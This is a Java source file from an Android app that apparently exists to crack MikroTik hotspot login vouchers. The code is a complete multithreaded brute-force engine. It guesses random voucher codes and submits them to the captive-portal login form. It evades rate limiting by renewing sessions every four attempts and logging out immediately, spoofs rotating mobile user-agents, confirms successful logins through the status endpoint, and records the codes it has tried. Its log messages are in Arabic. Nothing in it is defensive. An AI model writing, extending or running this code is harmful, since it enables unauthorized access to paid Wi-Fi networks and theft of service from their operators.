package com.example.mikrotikbrowser;

import android.content.SharedPreferences;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.atomic.*;
import org.json.JSONObject;

public class CrackerEngine {
    public interface Listener {
        void onLog(String msg);
        void onProgress(int cur, int total, String voucher);
        void onFound(String voucher, String status);
    }

    private static final int ATTEMPTS_PER_SESSION = 4;
    
    private final Listener listener;
    private final SharedPreferences prefs;
    private final String network;
    private final String loginUrl, statusUrl, logoutUrl, baseUrl;
    private final String prefix, suffix;
    private final int digits, maxAttempts, threads;
    private final int pauseMs;

    private final AtomicBoolean stopped = new AtomicBoolean(false);
    private final AtomicBoolean found = new AtomicBoolean(false);
    private final AtomicInteger done = new AtomicInteger(0);
    private final Set<String> tried;
    private final Random rng = new Random();
    private final List<Thread> workers = new ArrayList<>();

    public CrackerEngine(Listener l, SharedPreferences p, String network,
                         String loginUrl, String prefix, String suffix, int digits,
                         int maxAttempts, int threads, int pauseMs) {
        this.listener = l; this.prefs = p; this.network = network;
        this.loginUrl = loginUrl;
        try {
            String base = new URL(loginUrl).getProtocol() + "://" + new URL(loginUrl).getHost();
            this.baseUrl = base;
        } catch (Exception e) { throw new RuntimeException("bad url"); }
        this.statusUrl = baseUrl + "/status?var=callBack";
        this.logoutUrl = baseUrl + "/logout?erase-cookie=yes&var=callBack";
        this.prefix = prefix != null ? prefix : "";
        this.suffix = suffix != null ? suffix : "";
        this.digits = digits;
        this.maxAttempts = maxAttempts;
        this.threads = Math.max(1, Math.min(threads, 30));
        this.pauseMs = Math.max(0, pauseMs);
        this.tried = Collections.synchronizedSet(loadTried());
    }

    private Set<String> loadTried() {
        Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
        if (s.size() > 100000) {
            List<String> l = new ArrayList<>(s);
            s = new HashSet<>(l.subList(l.size() - 100000, l.size()));
        }
        return s;
    }

    public void stop() {
        stopped.set(true);
        synchronized (workers) {
            for (Thread t : workers) if (t != null) t.interrupt();
        }
    }

    public void start() {
        new Thread(this::runEngine, "CrackerMain").start();
    }

    private void runEngine() {
        try {
            log("▶ بدء المحرك (جلسات متجددة + تحرير فوري)");
            log("  الخيوط: " + threads + " | كل جلسة: " + ATTEMPTS_PER_SESSION + " محاولات");

            log("→ تسجيل خروج أولي...");
            logoutSession(null);
            sleep(800);

            log("  أرقام مجربة: " + tried.size());

            synchronized (workers) {
                workers.clear();
                for (int i = 0; i < threads; i++) {
                    final int wid = i;
                    Thread t = new Thread(() -> workerLoop(wid), "W" + wid);
                    workers.add(t);
                    t.start();
                    sleep(100);
                }
            }
            log("✓ يعمل الآن " + threads + " خيط بجلسات متجددة...");

            for (Thread t : new ArrayList<>(workers)) {
                try { t.join(); } catch (Exception e) {}
            }

            if (!found.get() && !stopped.get())
                log("❌ انتهى — " + done.get() + " محاولة");
        } catch (Exception e) {
            log("❌ خطأ: " + e.getMessage());
        }
    }

    private void workerLoop(int id) {
        while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
            Map<String, String> cookies = new HashMap<>();
            Map<String, String> template = openSession(cookies, id);
            
            if (template == null) {
                sleep(500 + rng.nextInt(500));
                continue;
            }

            // إرسال 4 محاولات فقط
            for (int i = 0; i < ATTEMPTS_PER_SESSION && !stopped.get() && !found.get(); i++) {
                if (done.get() >= maxAttempts) break;
                
                String v = generate();
                if (v == null) break;
                
                int cur = done.incrementAndGet();
                listener.onProgress(cur, maxAttempts, v);
                log("[W" + id + "] 🔍 " + v);
                
                Result r = tryLogin(cookies, template, v);
                if (stopped.get() || found.get()) return;
                
                if (r.success) {
                    found.set(true);
                    log("[W" + id + "] ✅✅✅ " + v);
                    logoutSession(cookies);
                    listener.onFound(v, r.statusJson);
                    return;
                }
                
                if (r.busy) {
                    log("[W" + id + "]   🛑 حظر — إغلاق الجلسة");
                    break;
                }
                
                if (r.error != null && !r.error.startsWith("network:")) {
                    log("[W" + id + "]   ❌ " + r.error);
                    saveTried(v);
                }
                
                if (pauseMs > 0) sleep(pauseMs + rng.nextInt(100));
            }
            
            // تحرير الجلسة
            logoutSession(cookies);
            cookies.clear();
            sleep(100 + rng.nextInt(200));
        }
    }

    private void logoutSession(Map<String, String> cookies) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(logoutUrl).openConnection();
            c.setConnectTimeout(3000);
            c.setReadTimeout(3000);
            c.setRequestProperty("User-Agent", ua());
            if (cookies != null && !cookies.isEmpty()) {
                c.setRequestProperty("Cookie", cookiesStr(cookies));
            }
            c.getResponseCode();
            c.disconnect();
        } catch (Exception e) {}
    }

    private Map<String, String> openSession(Map<String, String> cookies, int wid) {
        if (stopped.get()) return null;
        String ua = ua();
        try {
            HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
            c1.setConnectTimeout(4000); c1.setReadTimeout(4000);
            c1.setRequestProperty("User-Agent", ua);
            c1.getResponseCode();
            extractCookies(c1, cookies);
            c1.disconnect();
            if (stopped.get()) return null;

            HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
            c2.setConnectTimeout(4000); c2.setReadTimeout(4000);
            c2.setRequestProperty("User-Agent", ua);
            String ck = cookiesStr(cookies);
            if (!ck.isEmpty()) c2.setRequestProperty("Cookie", ck);
            
            int code2 = c2.getResponseCode();
            InputStream is2 = (code2 >= 400) ? c2.getErrorStream() : c2.getInputStream();
            String html = is2 != null ? read(is2) : "";
            extractCookies(c2, cookies);
            c2.disconnect();

            Map<String, String> fields = extractFields(html);
            log("[W" + wid + "] 🔄 جلسة جديدة");
            return fields;
        } catch (Exception e) {
            return null;
        }
    }

    private Map<String, String> extractFields(String html) {
        Map<String, String> fields = new LinkedHashMap<>();
        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
            "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
            java.util.regex.Pattern.CASE_INSENSITIVE);
        java.util.regex.Matcher m = p.matcher(html);
        while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
        
        if (fields.isEmpty()) {
            fields.put("username", "");
            fields.put("password", "");
            fields.put("dst", baseUrl + "/");
            fields.put("popup", "true");
        } else {
            fields.putIfAbsent("username", "");
            fields.putIfAbsent("password", "");
            fields.putIfAbsent("dst", baseUrl + "/");
        }
        return fields;
    }

    private Result tryLogin(Map<String, String> cookies, Map<String, String> template, String voucher) {
        if (stopped.get()) return Result.bad("stopped");
        String ua = ua();
        try {
            Map<String, String> fields = new LinkedHashMap<>(template);
            fields.put("username", voucher);
            fields.put("password", "");

            HttpURLConnection c = (HttpURLConnection) new URL(loginUrl).openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setInstanceFollowRedirects(false);
            c.setConnectTimeout(4000);
            c.setReadTimeout(4000);
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            c.setRequestProperty("User-Agent", ua);
            c.setRequestProperty("Referer", loginUrl);
            String ck = cookiesStr(cookies);
            if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);

            StringBuilder sb = new StringBuilder();
            for (Map.Entry<String, String> e : fields.entrySet()) {
                if (sb.length() > 0) sb.append("&");
                sb.append(URLEncoder.encode(e.getKey(), "UTF-8"))
                  .append("=")
                  .append(URLEncoder.encode(e.getValue(), "UTF-8"));
            }
            OutputStream os = c.getOutputStream();
            os.write(sb.toString().getBytes("UTF-8"));
            os.flush(); os.close();

            int code = c.getResponseCode();
            extractCookies(c, cookies);
            String body = "";
            try {
                InputStream is = (code >= 400) ? c.getErrorStream() : c.getInputStream();
                if (is != null) body = read(is);
            } catch (Exception e) {}
            c.disconnect();

            if (stopped.get()) return Result.bad("stopped");

            String low = body.toLowerCase();
            if (body.contains("already authorizing") || low.contains("already authorizing"))
                return Result.busy("already authorizing");

            // 🔥 السر: فحص الحالة أولاً قبل الحكم على الرقم!
            sleep(80);
            HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
            c4.setConnectTimeout(4000); c4.setReadTimeout(4000);
            c4.setRequestProperty("User-Agent", ua);
            String ck2 = cookiesStr(cookies);
            if (!ck2.isEmpty()) c4.setRequestProperty("Cookie", ck2);
            String statusBody = read(c4.getInputStream());
            c4.disconnect();

            try {
                JSONObject o = new JSONObject(statusBody);
                String li = o.optString("logged_in", "").toLowerCase();
                String un = o.optString("username", "").trim();
                if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un)) {
                    return Result.ok(statusBody);
                }
            } catch (Exception e) {}

            // إذا وصلنا هنا، الراوتر لم يسجل الدخول. الآن نفحص لو كان الرد يحتوي على خطأ
            if (low.contains("invalid") || low.contains("error") 
                || low.contains("wrong") || low.contains("denied")) {
                return Result.bad("خاطئ");
            }
            
            return Result.bad(null);
        } catch (Exception e) {
            return Result.bad("network: " + e.getMessage());
        }
    }

    private static class Result {
        boolean success, busy; String error; String statusJson;
        static Result ok(String j) { Result r = new Result(); r.success = true; r.statusJson = j; return r; }
        static Result bad(String e) { Result r = new Result(); r.error = e; return r; }
        static Result busy(String e) { Result r = new Result(); r.busy = true; r.error = e; return r; }
    }

    private String generate() {
        int max = (int) Math.pow(10, digits) - 1;
        for (int k = 0; k < 2000; k++) {
            int num = rng.nextInt(max + 1);
            String v = prefix + String.format(java.util.Locale.US, "%0" + digits + "d", num) + suffix;
            if (!tried.contains(v)) return v;
        }
        return null;
    }

    private void saveTried(String v) {
        tried.add(v);
        synchronized (prefs) {
            Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
            s.add(v);
            if (s.size() > 100000) {
                List<String> l = new ArrayList<>(s);
                s = new HashSet<>(l.subList(l.size() - 100000, l.size()));
            }
            prefs.edit().putStringSet("tried_" + network, s).apply();
        }
    }

    private void extractCookies(HttpURLConnection c, Map<String, String> store) {
        Map<String, List<String>> h = c.getHeaderFields();
        for (Map.Entry<String, List<String>> e : h.entrySet()) {
            if (e.getKey() != null && e.getKey().equalsIgnoreCase("Set-Cookie")) {
                for (String line : e.getValue()) {
                    int eq = line.indexOf('=');
                    if (eq < 0) continue;
                    int semi = line.indexOf(';', eq);
                    String n = line.substring(0, eq).trim();
                    String v = semi > 0 ? line.substring(eq + 1, semi).trim() : line.substring(eq + 1).trim();
                    store.put(n, v);
                }
            }
        }
    }

    private String cookiesStr(Map<String, String> store) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : store.entrySet()) {
            if (sb.length() > 0) sb.append("; ");
            sb.append(e.getKey()).append("=").append(e.getValue());
        }
        return sb.toString();
    }

    private String ua() {
        String[] a = {
            "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/118.0 Mobile",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 Chrome/115.0 Mobile",
            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 Chrome/110.0 Mobile"
        };
        return a[rng.nextInt(a.length)];
    }

    private String read(InputStream is) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = is.read(buf)) > 0) b.write(buf, 0, n);
        return b.toString("UTF-8");
    }

    private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
    private void log(String m) { listener.onLog(m); }
}
